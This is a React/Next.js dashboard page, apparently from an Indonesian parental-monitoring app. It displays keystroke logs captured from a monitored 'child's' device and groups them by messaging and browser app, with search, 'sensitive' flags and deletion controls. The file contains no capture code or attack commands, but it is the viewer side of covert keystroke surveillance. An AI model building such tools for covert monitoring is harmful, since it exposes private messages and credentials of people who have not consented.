'use client';

import React, { useEffect, useState, useCallback } from 'react';
import { AlertTriangle, Search, Loader2, RefreshCw, Keyboard, ShieldAlert, Cpu, Trash2 } from 'lucide-react';
import { supabase } from '../../../lib/supabase';

interface KeyloggerLog {
  id: string;
  app_package: string;
  typed_text: string;
  is_suspicious: boolean;
  recorded_at: string;
}

const APP_LABELS: Record<string, string> = {
  whatsapp: 'WhatsApp', instagram: 'Instagram', telegram: 'Telegram',
  orca: 'Messenger', facebook: 'Messenger', tiktok: 'TikTok',
  musically: 'TikTok', snapchat: 'Snapchat', twitter: 'Twitter/X', linkedin: 'LinkedIn',
  chrome: 'Google Chrome', browser: 'Browser', settings: 'Pengaturan Sistem',
};

function getAppLabel(pkg: string): string {
  for (const [k, v] of Object.entries(APP_LABELS)) {
    if (pkg.toLowerCase().includes(k)) return v;
  }
  return pkg.split('.').pop()?.toUpperCase() || 'App';
}

function timeAgo(dateStr: string): string {
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'Baru saja';
  if (mins < 60) return `${mins} mnt lalu`;
  const h = Math.floor(mins / 60);
  if (h < 24) return `${h} jam lalu`;
  return `${Math.floor(h / 24)} hari lalu`;
}

export default function KeyloggerPage() {
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [device, setDevice] = useState<any>(null);
  const [logs, setLogs] = useState<KeyloggerLog[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterSuspicious, setFilterSuspicious] = useState<boolean | 'all'>('all');
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [deletingIds, setDeletingIds] = useState<Set<string>>(new Set());

  const handleDelete = async (id: string) => {
    setDeletingIds(prev => new Set(prev).add(id));
    setLogs(prev => prev.filter(l => l.id !== id));
    await supabase.from('keylogger_logs').delete().eq('id', id);
    setDeletingIds(prev => { const n = new Set(prev); n.delete(id); return n; });
  };

  const [clearingAll, setClearingAll]   = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);

  const fetchData = useCallback(async (dev?: any, silent = false) => {
    const target = dev || device;
    if (!target) return;
    if (!silent) setRefreshing(true);
    try {
      const { data, error } = await supabase
        .from('keylogger_logs')
        .select('*')
        .eq('device_id', target.id)
        .order('recorded_at', { ascending: false })
        .limit(500);
      if (error) {
        setErrorMsg(`Gagal memuat log keylogger: ${error.message}`);
      } else if (data) {
        setLogs(data);
        setLastUpdated(new Date());
        setErrorMsg(null);
      }
    } catch (err: any) {
      setErrorMsg(`Network error: ${err?.message ?? err}`);
    } finally {
      setRefreshing(false);
    }
  }, [device]);

  useEffect(() => {
    const init = async () => {
      setLoading(true);
      setErrorMsg(null);
      try {
        const { data, error } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
        if (error) { setErrorMsg(`Supabase: ${error.message}`); return; }
        if (!data || data.length === 0) return;
        const saved = typeof window !== 'undefined' ? localStorage.getItem('selected_device_id') : null;
        const dev = data.find((d: any) => d.id === saved) || data[0];
        setDevice(dev);
        await fetchData(dev);
      } catch (err: any) {
        setErrorMsg(`Network error: ${err?.message ?? err}`);
      } finally {
        setLoading(false);
      }
    };
    init();
  }, []);

  useEffect(() => {
    if (!device) return;
    const channel = supabase.channel(`keylogger-${device.id}`)
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'keylogger_logs', filter: `device_id=eq.${device.id}` }, () => {
        fetchData(device, true);
      }).subscribe();
    const poll = setInterval(() => fetchData(device, true), 30000);
    return () => { supabase.removeChannel(channel); clearInterval(poll); };
  }, [device, fetchData]);

  const filteredLogs = logs.filter(log => {
    const matchesSearch = log.typed_text.toLowerCase().includes(searchQuery.toLowerCase()) ||
      log.app_package.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesSuspicious = filterSuspicious === 'all' || log.is_suspicious === filterSuspicious;
    return matchesSearch && matchesSuspicious;
  });

  const totalLogs = logs.length;
  const suspiciousCount = logs.filter(l => l.is_suspicious).length;

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] gap-3 text-textSecondary">
        <Loader2 className="animate-spin text-accentViolet" size={36} />
        <p className="text-sm">Memuat log keystroke...</p>
      </div>
    );
  }

  const handleClearAll = async () => {
    if (!device) return;
    if (!confirmClear) { setConfirmClear(true); return; }
    setClearingAll(true);
    setConfirmClear(false);
    try {
      await supabase.from('keylogger_logs').delete().eq('device_id', device.id);
      await fetchData();
    } catch (err: any) {
      console.error('Clear all failed', err);
    } finally {
      setClearingAll(false);
    }
  };

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Log Keylogger</h1>
          <p className="text-textSecondary mt-1 text-sm">
            Menampilkan aktivitas input keyboard real-time dari perangkat anak
          </p>
        </div>
        <div className="flex items-center gap-3">
          {lastUpdated && (
            <span className="text-[10px] text-textSecondary/70 hidden sm:inline">
              Update: {lastUpdated.toLocaleTimeString('id-ID')}
            </span>
          )}
          <button
            onClick={() => fetchData(device)}
            disabled={refreshing}
            className="p-2.5 glass-card rounded-xl text-textSecondary hover:text-textPrimary transition-colors disabled:opacity-50"
          >
            <RefreshCw size={16} className={refreshing ? 'animate-spin' : ''} />
          </button>
          <button
            onClick={handleClearAll}
            disabled={clearingAll || !device}
            onMouseLeave={() => setConfirmClear(false)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold transition-all disabled:opacity-40 ${
              confirmClear
                ? 'bg-red-600 text-white animate-pulse'
                : 'glass-card text-accentRed/70 hover:bg-red-950/30 hover:text-accentRed border border-red-900/20'
            }`}
          >
            {clearingAll ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
            {clearingAll ? 'Menghapus...' : confirmClear ? 'Konfirmasi hapus semua?' : 'Hapus Semua Ketikan'}
          </button>
        </div>
      </div>

      {errorMsg && (
        <div className="flex items-start gap-3 p-4 bg-red-950/30 border border-red-900/40 rounded-xl text-sm shrink-0">
          <AlertTriangle size={18} className="text-red-400 flex-shrink-0 mt-0.5" />
          <p className="text-red-300">{errorMsg}</p>
        </div>
      )}

      {/* Stats row */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 shrink-0">
        <div className="glass-card rounded-xl p-3 flex flex-col justify-center">
          <span className="text-[10px] text-textSecondary font-bold uppercase tracking-wider">Total Keystroke</span>
          <span className="text-xl font-bold mt-1 text-violetLight">{totalLogs}</span>
        </div>
        <div className="glass-card rounded-xl p-3 flex flex-col justify-center">
          <span className="text-[10px] text-textSecondary font-bold uppercase tracking-wider">Input Sensitif</span>
          <span className="text-xl font-bold mt-1 text-accentRed">{suspiciousCount}</span>
        </div>
      </div>

      {/* Toolbar Filters */}
      <div className="flex flex-wrap gap-3 items-center justify-between bg-cardBg/20 p-3 rounded-2xl border border-borderDark/40">
        <div className="relative w-80">
          <input
            type="text"
            placeholder="Cari teks keylogger..."
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            className="w-full bg-darkBg border border-borderDark rounded-xl pl-9 pr-3 py-2 text-xs text-textPrimary focus:outline-none focus:border-accentViolet focus:ring-1 focus:ring-accentViolet/30"
          />
          <Search className="absolute left-3 top-2.5 text-textSecondary" size={14} />
        </div>

        <div className="flex gap-2">
          <button
            onClick={() => setFilterSuspicious('all')}
            className={`px-3 py-1.5 rounded-lg text-xs font-bold border transition-all ${
              filterSuspicious === 'all'
                ? 'bg-accentViolet/15 text-violetLight border-accentViolet/40'
                : 'glass-card text-textSecondary hover:text-textPrimary'
            }`}
          >
            Semua Input
          </button>
          <button
            onClick={() => setFilterSuspicious(true)}
            className={`px-3 py-1.5 rounded-lg text-xs font-bold border transition-all ${
              filterSuspicious === true
                ? 'bg-accentRed/15 text-accentRed border-accentRed/40'
                : 'glass-card text-textSecondary hover:text-textPrimary'
            }`}
          >
            Sensitif Saja
          </button>
        </div>
      </div>

      {/* Keylogger Timeline Stream */}
      <div className="space-y-4">
        {filteredLogs.length === 0 ? (
          <div className="glass-card rounded-2xl p-10 text-center text-textSecondary">
            <Keyboard size={40} className="mx-auto mb-3 opacity-30" />
            <p className="text-sm italic">Belum ada data input keyboard yang masuk</p>
          </div>
        ) : (
          filteredLogs.map(log => (
            <div
              key={log.id}
              className={`glass-card rounded-xl p-4 border transition-all flex items-start justify-between gap-4 ${
                log.is_suspicious
                  ? 'border-accentRed/30 bg-accentRed/5'
                  : 'border-borderDark/40'
              }`}
            >
              <div className="flex items-start gap-3 min-w-0">
                <div className={`p-2 rounded-xl border shrink-0 mt-0.5 ${
                  log.is_suspicious
                    ? 'bg-accentRed/15 text-accentRed border-accentRed/20'
                    : 'bg-accentViolet/15 text-accentViolet border-accentViolet/20'
                }`}>
                  {log.is_suspicious ? <ShieldAlert size={18} /> : <Keyboard size={18} />}
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="text-xs font-bold text-textPrimary">
                      {getAppLabel(log.app_package)}
                    </span>
                    <span className="text-[10px] text-textSecondary/60 font-mono truncate max-w-[200px]" title={log.app_package}>
                      ({log.app_package})
                    </span>
                  </div>

                  <p className="text-sm font-mono mt-2 bg-darkBg/60 border border-borderDark/30 px-3 py-2 rounded-lg text-textPrimary break-all whitespace-pre-wrap">
                    {log.typed_text}
                  </p>

                  <p className="text-[10px] text-textSecondary/60 mt-2">
                    {new Date(log.recorded_at).toLocaleString('id-ID')} · {timeAgo(log.recorded_at)}
                  </p>
                </div>

              </div>
              <div className="flex flex-col items-end gap-2 shrink-0">
                {log.is_suspicious && (
                  <span className="text-[10px] font-black text-accentRed bg-accentRed/10 border border-accentRed/30 px-2 py-0.5 rounded-full flex items-center gap-1">
                    <AlertTriangle size={11} /> SENSITIF
                  </span>
                )}
                <button
                  onClick={() => handleDelete(log.id)}
                  disabled={deletingIds.has(log.id)}
                  className="p-1.5 rounded-lg text-textSecondary/40 hover:text-red-400 hover:bg-red-500/10 transition-all disabled:opacity-30"
                  title="Hapus entri ini"
                >
                  {deletingIds.has(log.id) ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
                </button>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  );
}
